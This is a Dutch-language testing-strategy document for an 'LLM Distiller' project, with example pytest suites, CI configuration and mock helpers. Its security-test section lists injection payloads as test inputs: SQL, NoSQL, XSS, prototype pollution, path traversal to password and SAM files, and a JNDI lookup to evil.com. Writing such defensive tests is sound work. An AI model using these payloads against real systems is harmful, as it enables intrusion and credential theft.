# Testing Strategy

Dit document beschrijft de testing strategie voor de LLM Distiller, inclusief test types, frameworks en best practices.

## 📋 Overzicht

De testing strategie omvat:
- **Unit Tests**: Test individuele componenten
- **Integration Tests**: Test component interacties
- **End-to-End Tests**: Test complete workflows
- **Performance Tests**: Test onder load
- **Security Tests**: Test security aspecten

## 🧪 Test Types

### 1. Unit Tests

#### Doel
- Test individuele functions en classes
- Snel feedback op code changes
- Hoge test coverage
- Isolatie van dependencies

#### Coverage Requirements
- **Minimum**: 80% line coverage
- **Target**: 90% line coverage
- **Critical paths**: 100% coverage

#### Test Structure
```python
# tests/unit/test_models.py
import pytest
from unittest.mock import Mock, patch
from src.database.models import Question, Response

class TestQuestion:
    """Unit tests for Question model"""
    
    def test_question_creation_with_required_fields(self):
        """Test creating question with only required fields"""
        question = Question(
            category="math",
            question_text="What is 2+2?"
        )
        
        assert question.category == "math"
        assert question.question_text == "What is 2+2?"
        assert question.golden_answer is None
        assert question.answer_schema is None
    
    def test_question_with_all_fields(self):
        """Test creating question with all fields"""
        schema = '{"type": "object", "properties": {"answer": {"type": "number"}}}'
        question = Question(
            json_id="test-1",
            category="math",
            question_text="What is 2+2?",
            golden_answer="4",
            answer_schema=schema
        )
        
        assert question.json_id == "test-1"
        assert question.has_schema is True
        assert question.parsed_schema is not None
    
    def test_question_validation_empty_category(self):
        """Test that empty category raises validation error"""
        with pytest.raises(ValueError, match="Category cannot be empty"):
            Question(category="", question_text="Test")
    
    def test_question_validation_empty_question(self):
        """Test that empty question raises validation error"""
        with pytest.raises(ValueError, match="Question text cannot be empty"):
            Question(category="test", question_text="")
    
    def test_parsed_schema_invalid_json(self):
        """Test handling of invalid JSON schema"""
        question = Question(
            category="test",
            question_text="Test",
            answer_schema="invalid json"
        )
        
        assert question.has_schema is True  # Non-empty string
        assert question.parsed_schema is None
    
    @patch('src.database.models.datetime')
    def test_timestamps_on_creation(self, mock_datetime):
        """Test that timestamps are set on creation"""
        mock_now = Mock()
        mock_datetime.now.return_value = mock_now
        
        question = Question(category="test", question_text="Test")
        
        assert question.created_at == mock_now
        assert question.updated_at == mock_now
```

### 2. Integration Tests

#### Doel
- Test interacties tussen components
- Database integration
- LLM provider integration
- File system operations

#### Test Structure
```python
# tests/integration/test_database.py
import pytest
import tempfile
import os
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from src.database.models import Base, Question, Response
from src.database.connection import DatabaseManager

class TestDatabaseIntegration:
    """Integration tests for database operations"""
    
    @pytest.fixture
    def temp_db(self):
        """Temporary database for testing"""
        with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as f:
            db_path = f.name
        
        engine = create_engine(f'sqlite:///{db_path}')
        Base.metadata.create_all(engine)
        
        SessionLocal = sessionmaker(bind=engine)
        session = SessionLocal()
        
        yield session
        
        session.close()
        os.unlink(db_path)
    
    def test_question_response_relationship(self, temp_db):
        """Test question-response relationship"""
        # Create question
        question = Question(
            category="math",
            question_text="What is 2+2?"
        )
        temp_db.add(question)
        temp_db.flush()
        
        # Create response
        response = Response(
            question_id=question.id,
            model_name="test-model",
            answer="4",
            model_config='{"model": "test-model"}'
        )
        temp_db.add(response)
        temp_db.commit()
        
        # Verify relationship
        retrieved_question = temp_db.query(Question).filter(
            Question.id == question.id
        ).first()
        
        assert len(retrieved_question.responses) == 1
        assert retrieved_question.responses[0].answer == "4"
        assert retrieved_question.responses[0].question == retrieved_question
    
    def test_cascade_delete(self, temp_db):
        """Test cascade delete behavior"""
        # Create question with response
        question = Question(category="test", question_text="Test")
        temp_db.add(question)
        temp_db.flush()
        
        response = Response(
            question_id=question.id,
            model_name="test-model",
            answer="Test answer",
            model_config='{"model": "test-model"}'
        )
        temp_db.add(response)
        temp_db.commit()
        
        # Delete question
        temp_db.delete(question)
        temp_db.commit()
        
        # Verify response is also deleted
        remaining_response = temp_db.query(Response).filter(
            Response.question_id == question.id
        ).first()
        
        assert remaining_response is None
    
    def test_database_manager_integration(self):
        """Test DatabaseManager with real database"""
        with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as f:
            db_path = f.name
        
        try:
            config = {"url": f"sqlite:///{db_path}", "echo": False}
            manager = DatabaseManager(config)
            
            # Test session creation
            with manager.get_session() as session:
                question = Question(category="test", question_text="Test")
                session.add(question)
                session.commit()
                
                # Verify persistence
                count = session.query(Question).count()
                assert count == 1
        
        finally:
            os.unlink(db_path)
```

### 3. End-to-End Tests

#### Doel
- Test complete user workflows
- CLI integration
- File I/O operations
- Real LLM provider calls (mocked)

#### Test Structure
```python
# tests/e2e/test_workflows.py
import pytest
import tempfile
import os
import json
from click.testing import CliRunner
from src.main import cli

class TestEndToEndWorkflows:
    """End-to-end tests for complete workflows"""
    
    def test_csv_import_to_export_workflow(self):
        """Test complete CSV import to export workflow"""
        runner = CliRunner()
        
        # Create temporary CSV file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.csv', delete=False) as f:
            f.write("category,question,answer_schema\n")
            f.write("math,What is 2+2?,{\"type\": \"object\", \"properties\": {\"answer\": {\"type\": \"number\"}}}\n")
            f.write("science,What is H2O?,{\"type\": \"object\", \"properties\": {\"answer\": {\"type\": \"string\"}}}\n")
            csv_path = f.name
        
        # Create temporary export file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.jsonl', delete=False) as f:
            export_path = f.name
        
        try:
            # Initialize database
            init_result = runner.invoke(cli, ['init', '--database-url', 'sqlite:///test_e2e.db'])
            assert init_result.exit_code == 0
            
            # Import CSV
            import_result = runner.invoke(cli, [
                'import', 'csv', csv_path,
                '--config-path', './tests/fixtures/test_config.json'
            ])
            assert import_result.exit_code == 0
            assert "Successfully imported 2 questions" in import_result.output
            
            # Export data
            export_result = runner.invoke(cli, [
                'export', '--output', export_path,
                '--config-path', './tests/fixtures/test_config.json'
            ])
            assert export_result.exit_code == 0
            
            # Verify export content
            with open(export_path, 'r') as f:
                exported_lines = f.readlines()
                assert len(exported_lines) == 2
                
                # Parse first line
                first_export = json.loads(exported_lines[0])
                assert first_export['category'] == 'math'
                assert 'What is 2+2?' in first_export['question_text']
        
        finally:
            os.unlink(csv_path)
            os.unlink(export_path)
            if os.path.exists('test_e2e.db'):
                os.unlink('test_e2e.db')
    
    @pytest.mark.slow
    def test_question_processing_workflow(self):
        """Test complete question processing workflow"""
        runner = CliRunner()
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            questions = {
                "questions": [
                    {
                        "json_id": "1",
                        "category": "math",
                        "question": "What is 2+2?",
                        "answer_schema": {"type": "object", "properties": {"answer": {"type": "number"}}}
                    }
                ]
            }
            json.dump(questions, f)
            json_path = f.name
        
        try:
            # Import questions
            import_result = runner.invoke(cli, [
                'import', 'json', json_path,
                '--config-path', './tests/fixtures/test_config.json'
            ])
            assert import_result.exit_code == 0
            
            # Process with mock provider
            process_result = runner.invoke(cli, [
                'process', '--limit', '1',
                '--provider', 'mock_provider',
                '--config-path', './tests/fixtures/test_config.json'
            ])
            assert process_result.exit_code == 0
            assert "Processed 1 questions" in process_result.output
            
            # Verify response was created
            stats_result = runner.invoke(cli, [
                'stats', 'db',
                '--config-path', './tests/fixtures/test_config.json'
            ])
            assert stats_result.exit_code == 0
            assert "responses: 1" in stats_result.output
        
        finally:
            os.unlink(json_path)
```

### 4. Performance Tests

#### Doel
- Test performance onder load
- Identificeer bottlenecks
- Valideer scalability
- Monitor resource usage

#### Test Structure
```python
# tests/performance/test_load.py
import pytest
import time
import asyncio
import psutil
from concurrent.futures import ThreadPoolExecutor
from src.llm.client import LLMProviderManager
from src.database.connection import DatabaseManager

class TestPerformance:
    """Performance tests for system components"""
    
    @pytest.mark.performance
    def test_database_insert_performance(self):
        """Test database insert performance"""
        config = {"url": "sqlite:///:memory:", "echo": False}
        manager = DatabaseManager(config)
        
        # Measure insert performance
        start_time = time.time()
        
        with manager.get_session() as session:
            for i in range(1000):
                question = Question(
                    category=f"category_{i % 10}",
                    question_text=f"Question {i}"
                )
                session.add(question)
                
                if i % 100 == 0:
                    session.flush()
            
            session.commit()
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Performance assertion (should insert 1000 records in < 5 seconds)
        assert duration < 5.0, f"Insert took {duration:.2f} seconds"
        assert 1000 / duration > 200, f"Insert rate: {1000/duration:.2f} records/sec"
    
    @pytest.mark.performance
    def test_concurrent_api_requests(self):
        """Test concurrent API request handling"""
        provider_config = {
            "test_provider": {
                "type": "openai",
                "api_key": "test-key",
                "base_url": "http://localhost:9999/v1",
                "rate_limit": {"requests_per_minute": 100}
            }
        }
        
        manager = LLMProviderManager(provider_config)
        
        async def make_request():
            """Simulate API request"""
            start_time = time.time()
            try:
                # Mock request - in real test would call actual API
                await asyncio.sleep(0.1)  # Simulate network latency
                return time.time() - start_time
            except Exception:
                return time.time() - start_time
        
        # Test concurrent requests
        start_time = time.time()
        tasks = [make_request() for _ in range(50)]
        response_times = asyncio.run(asyncio.gather(*tasks))
        total_time = time.time() - start_time
        
        # Performance assertions
        avg_response_time = sum(response_times) / len(response_times)
        assert avg_response_time < 0.5, f"Average response time: {avg_response_time:.3f}s"
        assert total_time < 10.0, f"Total time for 50 requests: {total_time:.2f}s"
    
    @pytest.mark.performance
    def test_memory_usage_during_processing(self):
        """Test memory usage during large dataset processing"""
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        # Simulate processing large dataset
        large_data = []
        for i in range(10000):
            large_data.append({
                'id': i,
                'text': f"Large text content for item {i} " * 100,
                'metadata': {'category': f'cat_{i % 10}', 'priority': i % 3}
            })
        
        # Process data
        processed_count = 0
        for item in large_data:
            # Simulate processing
            processed = {
                'id': item['id'],
                'processed_text': item['text'].upper(),
                'category': item['metadata']['category']
            }
            processed_count += 1
        
        peak_memory = process.memory_info().rss / 1024 / 1024  # MB
        memory_increase = peak_memory - initial_memory
        
        # Memory assertions
        assert processed_count == 10000
        assert memory_increase < 500, f"Memory increased by {memory_increase:.2f} MB"
        
        # Cleanup
        del large_data
```

### 5. Security Tests

#### Doel
- Test input validation
- Test authentication/authorization
- Test data encryption
- Test injection vulnerabilities

#### Test Structure
```python
# tests/security/test_validation.py
import pytest
from src.validation.schema_validator import SchemaValidator

class TestSecurityValidation:
    """Security tests for input validation"""
    
    def test_malicious_json_injection(self):
        """Test handling of malicious JSON injection attempts"""
        validator = SchemaValidator()
        
        # Test various injection attempts
        malicious_inputs = [
            '{"__proto__": {"polluted": true}}',
            '{"constructor": {"prototype": {"polluted": true}}}',
            '{"$where": "this.password == \\"password\\""}',
            '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}',
            '<script>alert("xss")</script>',
            '"; DROP TABLE questions; --',
            '../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
        ]
        
        schema = '{"type": "object", "properties": {"input": {"type": "string"}}}'
        
        for malicious_input in malicious_inputs:
            result = validator.validate_response(malicious_input, schema)
            
            # Should either fail validation or be safely handled
            if result.is_valid:
                # If valid, ensure no code execution
                assert '<script>' not in result.data.get('input', '')
                assert 'DROP TABLE' not in result.data.get('input', '')
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention in database operations"""
        # This would test actual database operations
        # Ensure parameterized queries are used
        pass
    
    def test_path_traversal_prevention(self):
        """Test path traversal prevention in file operations"""
        malicious_paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\Windows\\System32\\config\\SAM',
        ]
        
        for path in malicious_paths:
            # Test file operation functions
            # Ensure paths are sanitized
            sanitized = self.sanitize_path(path)
            assert '..' not in sanitized
            assert not sanitized.startswith('/')
            assert ':' not in sanitized
    
    def sanitize_path(self, path: str) -> str:
        """Example path sanitization function"""
        import os
        # Remove directory traversal
        path = path.replace('..', '').replace('\\', '')
        # Remove leading slashes
        path = path.lstrip('/')
        # Keep only filename
        return os.path.basename(path)
```

## 🛠️ Testing Frameworks

### Core Frameworks
```txt
# Testing frameworks
pytest>=7.0.0              # Main testing framework
pytest-asyncio>=0.21.0     # Async testing support
pytest-cov>=4.0.0           # Coverage reporting
pytest-mock>=3.10.0         # Mocking support
pytest-xdist>=3.0.0         # Parallel testing
pytest-benchmark>=4.0.0      # Performance testing
```

### Specialized Testing
```txt
# Security testing
bandit>=1.7.0               # Security vulnerability scanner
safety>=2.3.0                # Dependency vulnerability checker

# Load testing
locust>=2.15.0               # Load testing framework
pytest-loadtest>=0.1.0       # Load testing plugin

# Property-based testing
hypothesis>=6.0.0            # Property-based testing
```

## 📊 Test Configuration

### Pytest Configuration
```ini
# pytest.ini
[tool:pytest]
testpaths = tests
python_files = test_*.py
python_classes = Test*
python_functions = test_*
addopts = 
    --strict-markers
    --strict-config
    --verbose
    --cov=src
    --cov-report=html
    --cov-report=term-missing
    --cov-fail-under=80
    --tb=short
markers =
    unit: Unit tests
    integration: Integration tests
    e2e: End-to-end tests
    performance: Performance tests
    security: Security tests
    slow: Slow running tests
    external: Tests requiring external services
```

### Coverage Configuration
```ini
# .coveragerc
[run]
source = src
omit = 
    */tests/*
    */venv/*
    */migrations/*
    setup.py

[report]
exclude_lines =
    pragma: no cover
    def __repr__
    raise AssertionError
    raise NotImplementedError
    if __name__ == .__main__.:
    if TYPE_CHECKING:

[html]
directory = htmlcov
```

## 🚀 Continuous Integration

### GitHub Actions Workflow
```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: [3.9, 3.10, 3.11]

    services:
      postgres:
        image: postgres:13
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_DB: test_db
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python ${{ matrix.python-version }}
      uses: actions/setup-python@v4
      with:
        python-version: ${{ matrix.python-version }}
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements.txt
        pip install -r requirements-dev.txt
    
    - name: Run unit tests
      run: |
        pytest tests/unit -v --cov=src --cov-report=xml
    
    - name: Run integration tests
      run: |
        pytest tests/integration -v
      env:
        DATABASE_URL: postgresql://postgres:test@localhost:5432/test_db
    
    - name: Run security tests
      run: |
        bandit -r src/
        safety check
    
    - name: Upload coverage to Codecov
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.xml
        flags: unittests
        name: codecov-umbrella

  performance:
    runs-on: ubuntu-latest
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: 3.9
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements.txt
        pip install -r requirements-dev.txt
    
    - name: Run performance tests
      run: |
        pytest tests/performance -v --benchmark-json=benchmark.json
    
    - name: Store benchmark result
      uses: benchmark-action/github-action-benchmark@v1
      with:
        tool: 'pytest'
        output-file-path: benchmark.json
```

## 📈 Test Metrics

### Coverage Metrics
- **Line Coverage**: Percentage of code lines executed
- **Branch Coverage**: Percentage of code branches executed
- **Function Coverage**: Percentage of functions called
- **Statement Coverage**: Percentage of statements executed

### Performance Metrics
- **Response Time**: API response times
- **Throughput**: Requests per second
- **Memory Usage**: Peak memory consumption
- **CPU Usage**: CPU utilization during tests

### Quality Metrics
- **Test Pass Rate**: Percentage of passing tests
- **Flaky Test Rate**: Percentage of inconsistent tests
- **Test Execution Time**: Total test suite duration
- **Test Coverage**: Overall code coverage percentage

## 🔧 Test Utilities

### Mock Providers
```python
# tests/helpers/mock_providers.py
from unittest.mock import AsyncMock
from src.llm.client import LLMResponse, GenerationConfig

class MockLLMProvider:
    """Mock LLM provider for testing"""
    
    def __init__(self, responses=None):
        self.responses = responses or []
        self.call_count = 0
    
    async def generate_response(self, prompt: str, config: GenerationConfig) -> LLMResponse:
        """Generate mock response"""
        response = self.responses[self.call_count % len(self.responses)]
        self.call_count += 1
        
        return LLMResponse(
            content=response['content'],
            model=config.model,
            usage=response.get('usage', {'total_tokens': 10}),
            response_time=0.1
        )

def create_mock_provider():
    """Create mock provider with default responses"""
    responses = [
        {
            'content': 'The answer is 4.',
            'usage': {'prompt_tokens': 5, 'completion_tokens': 5, 'total_tokens': 10}
        },
        {
            'content': 'The answer is Water.',
            'usage': {'prompt_tokens': 5, 'completion_tokens': 5, 'total_tokens': 10}
        }
    ]
    
    return MockLLMProvider(responses)
```

### Test Data Generators
```python
# tests/helpers/data_generators.py
import json
import random
from faker import Faker

fake = Faker()

class QuestionDataGenerator:
    """Generate test data for questions"""
    
    @staticmethod
    def generate_question(category=None):
        """Generate a single question"""
        categories = ['math', 'science', 'history', 'literature', 'geography']
        category = category or random.choice(categories)
        
        return {
            'json_id': fake.uuid4(),
            'category': category,
            'question_text': fake.sentence(),
            'golden_answer': fake.sentence(),
            'answer_schema': json.dumps({
                'type': 'object',
                'properties': {
                    'answer': {'type': 'string'}
                }
            })
        }
    
    @staticmethod
    def generate_questions(count=10):
        """Generate multiple questions"""
        return [QuestionDataGenerator.generate_question() for _ in range(count)]
    
    @staticmethod
    def generate_csv_data(count=10):
        """Generate CSV format test data"""
        questions = QuestionDataGenerator.generate_questions(count)
        
        csv_lines = ['json_id,category,question,golden_answer,answer_schema']
        for q in questions:
            line = f'{q["json_id"]},{q["category"]},"{q["question_text"]}","{q["golden_answer"]}","{q["answer_schema"]}"'
            csv_lines.append(line)
        
        return '\n'.join(csv_lines)
```

---

*Deze testing strategie zorgt voor betrouwbare, onderhoudbare code met hoge kwaliteit en performance.*